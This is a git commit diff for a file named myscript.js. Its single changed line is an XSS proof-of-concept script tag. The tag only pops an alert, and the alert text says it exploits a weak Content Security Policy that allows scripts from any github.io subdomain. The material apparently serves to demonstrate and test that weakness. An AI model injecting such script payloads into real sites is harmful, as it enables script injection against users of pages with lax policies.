4eefdd937cf78f7ea0c82e6d5e3c2f412398cac1
t3chn0t3s <46801776+t3chn0t3s@users.noreply.github.com>
2024-12-05 02:55:12 -0600

    Update myscript.js

--- myscript.js
+++ myscript.js
@@ -1,1 +1,1 @@
-<script>alert('This is an XSS that takes advantage of a weak CSP allowing script-src from https://*.github.io');</script>
+<script type="application/javascript">alert('This is an XSS that takes advantage of a weak CSP allowing script-src from https://*.github.io');</script>
